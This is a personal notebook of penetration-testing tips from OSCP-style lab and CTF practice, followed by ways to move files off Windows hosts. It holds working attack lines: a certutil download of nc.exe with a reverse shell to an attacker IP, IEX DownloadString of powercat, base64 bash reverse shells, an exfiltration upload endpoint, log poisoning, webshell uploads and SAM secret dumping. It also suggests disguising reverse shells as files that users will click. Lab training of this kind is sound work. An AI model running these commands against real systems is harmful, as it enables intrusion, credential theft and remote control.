Here is the reformatted content with each point preceded by a dash and placed on a new line:

---

## Takeaways from Experience

- Jaws, privesccheck.ps1 are worth running if you're completely stuck. Jaws easily identifies whether spooler is running for potato exploits.
- When in doubt, new technology, unfamiliar port, check hack tricks. Sweetpotato & god potato.
- How to know which version of Net (for sharp collection)?
- Laps, read admin password.
- When testing for SSTI, try {{7*7}}.
- /var/tmp/payload.sh is best guess.
- Always run pspy, especially if a cronjob is running.
- Pkexec->pwnkit.
- If you see a Pyc file, especially if it is in an interesting location, decompile it and view the code.
- If your file upload attack just isn't working, check if you can upload .htaccess, find where it’s saved, and then upload webshell (AddType application/x-httpd-php .genius or .anymadeupname).
- SeManageVolumeExploit.exe.
- Check headers for windows api when you're submitting information in a form, especially a link, then set up responder and try to capture hashes when it hits your tun0.
- A reliable way to get shell on Windows is to transfer nc.exe and do a simple nc reverse shell, same as the one from hacktricks god potato.
- If you're in a Windows database server, and you're trying to communicate out, 8082 is the outbound database port, use this if transferring from database.
- Simple way to get more information about files in directory, such as who owns them: 'dir /a /o /q'
- If you see a lot of custom content on a CTF website, you should use cewl and create a custom wordlist.
- Always fuzz php parameters in browser if you get the opportunity (find S1RENs offsec walkthrough).
- Say that you're within the system, and you're trying to get in as www, you can poison the logs of /proc/self/environ, /var/log/auth.log, or access.log and then do ?&cmd=payload.
- Run ls -lsa in ftp so that you don't skip over hidden files.
- Btop is a cooler version of htop.
- Be aware that you need to use a -sT tcp connect scan to scan certain proxies.
- If you can’t ls inside of directory, try getfacl & potentially cat the files inside.
- Even if directory is 403, you can FUZZ past it. 
- nmap —script=smb-enum-shares.
- Write permissions for smb? -> upload revshell in disguise. Look for files that you know people are going to click on, ideally replacing those.
- Joomla->joom scan.
- Always look up vulnerabilities, even for seemingly homemade software (check the tab title).
- Make sure to spray usernames as passwords as well (in another cat file).
- Always check for default credentials.
- If stagless shell isn’t working, try a staged one.
- Read through the entire exploit code, there may be a little comment that means everything.
- If you’re getting a little functionality or progress with a PoC, but it doesn’t ultimately work, try another one (or two).
- If a machine is slow, revert it right away.
- Run "dig any website.offsec @IP" to query more information about the DNS server.
- When doing the "php://filter/convert.base64-encode/resource=index" thing, look for included files in the code, and then replace the value, in this case, index, to keep investigating code.
- If you're in a situation where you can upload a zip file, there's a php module where you can make the server read it, "192.168.234.229/index.php?file=zip://uploads/upload_1715711517.zip#rev" (https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------).
- If nothing is working on a file upload, you can try to overwrite their .htaccess file with your own, "AddType application/x-httpd-php .genius"
- If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystem, run "impacket-secretsdump -sam SAM -system SYSTEM LOCAL".
- If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the "Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"" and execute a reverse shell to get onto the system as them.
- If a normal bash reverse shell doesn't work in a php command, try encoding it and setting the port to 443 or 80.
- Always try password reuse, even and especially in mysql. This should be automatic. Create a script that you can run with netexec that automatically runs the gauntlet whenever you get any new creds, even if they are just prospective. Be aware of the lockout policy.
- Try to upload a malicious plugin for WordPress, or any CMS, if possible. CMSs also cry for public exploits in the CTF world.
- If you have access to the files in /var/www/html/ and there's a website that you are unable to access, whether it be on the loopback or not, configure the website code where you can login.
- Check if you have access to the webroot with SMB so you can put a web shell in there.
- Always search through history files, for kdbx, and txt files.
- Always try ftp with the username anonymous and the password anonymous.
- If you have a resolved domain, always add it to your hosts file, then test for subdomains with "gobuster dns -d relia.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30", with the weird open http port that you found (if relevant), "http://web02.relia.com:14080/".
- If one exploit isn't doing the job, check out another one, if that doesn't work, there are some great exploits that are available on GitHub through Google. Blogs that walk you through exploits are awesome and help understand the vulnerability you're facing, which helps you personalize it to your situation.
- If the executable that runs the msfvenom path doesn't work, try the other c code that creates an admin user on the system.
- Always check out exploits for Apache and the other web technologies. It's crazy how often these pop up.
- Always check for alternative file names, in the case of id_rsa, check for ".ssh/id_dsa, .ssh/id_ecdsa, .ssh/id_ed25519, .ssh/authorized_keys". Note that nmap should show you which keys they are using.
- If possible, always compile the exploit on the target machine. Only do it on your machine (in the CTF context) if you run into a gajillion issues.
- Whenever you see a question mark in the URL, think LFI, PHP wrappers, SQLi.
- If you have LFI and can already get a shell on the server, plant a reverse shell in the web root and execute it through the LFI.
- If you're stuck on a Linux system, use pspy.
- Find a way to upload document to ANY directory in the webroot, always recursively search for directories.
- Try all of the netexec enumeration commands to verify credentials, explore vectors. Create a script to do do.
- When using wget in a payload, don't do http://$IP.. leave out the 'http://'. There was a payload that didn't work when you kept the http://.
- If nc isn't working for a revshell, and there are common variables to what you saw with the Berlin box, aka spring boot and java, try adding "busybox" in front of the command. Revshells.com has a version.
- For port 8443, use a hostname with HTTPS instead of HTTP. (Face palm).
- Say that you upload a web or reverse shell on one port (example 8443), the method of accessing it may be through one of the other port (such as 8000). Enumerate to find place the wwwroot.
- If there is a URL input on a Windows server, try to ping your own server and capture the hash with responder.
- When there is a URL input, instead of accessing your python server, you can create an impacket smb server and get a file through that method. For some reason, this works sometimes while the python server does not.
- If you get credentials, you should always rewind and try to log in the original services that you were trying to enumerate, such as ftp where you can place a shell in the webroot. This has come up again and again.
- Assume that the name of the box is a username on the system.
- Do you need to have the id_rsa.pub in your directory? not only the private key? try pub 666 priv 600.
- If there are any weird binaries that stick out, especially if they have suids or guids set, run a string against them and check whether they have any relative paths that you can hijack. you could simply modify the path (put a writable directory at the front) & put a reverse shell in the writable directory which the same name. just make sure to change the permissions to make it executable
- Start at the smaller attack surfaces, and work your way to the larger ones if need be.
- If you can upload/overwrite files, try to add a modified /etc/passwd with you in there, whenever you can, always do "../../../../../../../../etc/passwd" to avoid risking a lot of your time.
- If anything has a password, and you can't get into it, hashcat can probably crack it.. I made this mistake with the zip file.. it's worth a search to find out if it is possible.
- Whenever you're facing an exposed .git repository, try using git-dumper to ease the process.
- Sometimes you're unable to ssh into a user with the password that you have, and instead, have to 'su username' to login as that user. Do not forget to do this.
- If something seems out of the ordinary, attack the fuck out of it. The more experience you have, the better instincts you will have.
- Always check the SAM if there's any sort of backup or loose permissions in SMB.
- Dumping secrets is mainstream knowledge, stop slackin' (C:\windows.old\windows\system32\SAM & SYSTEM>) -> "/usr/local/bin/secretsdump.py -sam SAM -system SYSTEM LOCAL".
- If you can see that your shell is not maintaining, try modifying the exploit code to suit your needs. In this case, I downloaded and ran nc.exe. "certutil.exe -urlcache -split -f http://192.168.45.195:443/nc.exe C:\Windows\Tasks\nc.exe & C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.195 80" instead of typing the command as a parameter to the exploit.
- For any weird port, search up related exploit along with any fingerprint that you have to narrow down results.
- If there's a weird port, such as cgms 3003, try to connect to it and get the version "nc -zv $IP -> help -> version -> search exploit". If this makes no sense you can also refer to "https://github.com/xsudoxx/OSCP".
- Always search for exploits using terms as vague as possible, then narrow down afterwards, this way you don't miss something.
- If you have problems compiling an exploit on a target, try doing it on your local computer.
- If you're POSTing data for a website, try to modify the route. In this case, an exploit relied on htmLawed.php for the exploit to work, and when it tried to post there, it noticed that there was no file with this name. When I modified the route to '/', it worked.
- If you're modifying an exploit, and it's not working and you're getting a 400 error, you're not cleaning/modifying the GET/POST request correctly. Check if there are newlines where there are not supposed to be.
- Use jadx to look at interested .apk files
- Always enumerate and find unique files and their permissions, groups\
- Stop forgetting to try default credentials before you try a bunch of fancy stuff
- Look at the requests and headers of interesting urls, files, directories.. sometimes you'll find interesting hashed passwords and credentials. You never know.
- If you have access to SMB shares, keep in mind that the actual server may have the same exact structure, especially if there's a backup share. Keep in mind the files where you find passwords, you may never know if you will end up crafting a file inclusion attack with their updated passwords or info.
- If your shell is immediately disconnecting, then try the rlwrap thing
- If you cannot connent to your python server, try switching the port to 80
- If you can't find the powershell command/binary, check "C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe"
- Don't forget about the "echo encoded_reverse|base64 -d| bash" reverse shell
- https://www.blakejarvis.com/oscp/oscp-things-to-try-when-stuck
- Enumerate users in ldap: "ldapsearch -x -H ldap://$ip -D '' -w '' -b "DC=hutch,DC=offsec""
- If you have creds, there may be a webdav that you can access with cadaver in order to upload a web shell, "cadaver $ip". I saw that there was a webdav in my Nikto output, but didn't know how to go about solving it.
- If you're accessing internal websites on your loopback interface, don't forget to add the hostname to /etc/hosts "127.0.0.1 website.com"
- Don't listen to nxc if it says that smb, winrm, rdp, or whatever vector cannot be logged into with the creds that you have. Try it anyway. 
- If your php windows reverse shell seems to not stick, immediately disconnects, upload simple html.php, set the path, then run the nc.exe command from god potato
- If you're chiseling to look at mssql through the website on your localhost, go to phpmyadmin directory on the website
- If you see something unusual, but it requires a password and it just skips over the password for whatever reason (doesn't let you input one), echo and pipe a password
- Always fucking enumerate once you get Admin. You would've failed the exam.
- Do not trust nxc's mssql  thing. try it manually, "impacket-mssqlclient administrator:hghgib6vHT3bVWf@10.10.112.154 -windows-auth"
- If you have a username, such as jack, also try Jack when you're logging into stuff
- It's a good idea to mimick the port # when getting a reverse shell. Mouse Server 9099 -> nc -lvnp 9099
- jaws will tell you the firewall rules, use revshells accordingly, ex: "Outbound-tcp 8080,80,88,135,139,445,53,389"
- If you don't know what a port is, google "port {port} exploit"
- When replacing a binary, make sure to transfer it directly to the location that it needs to be (or the same directory), that way it keeps the Administrator ownership
















Nothing is 100% bullet-proof. This is why I have several options to accomplish this.
1- As already mentioned, impacket-smbserver -smb2support test . is gold.
2- python -m pyftpdlib -w will spawn a ftp server on you kali. use the ftp command on windows to transfer the file(s).
3- On Kali: nc -lvp 4444 > TransferedFile on Windows: nc.exe <kali_ip> 4444 -w 5 < FileToTransfer
4- Using powercat + powershell. Host powercat.ps1(link: https://github.com/besimorhino/powercat/blob/master/powercat.ps1) in a webserver on the attacker machine. Execute powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://kali-ip/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoTransfer" On kali: wget http://windows-ip:4444/FileToTransfer
5- Host the below php on a php-enabled webserver on kali:

<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

Use a webbrowser on the victim to access the page and upload the desired file or use the below powershell to accomplish the same:

powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
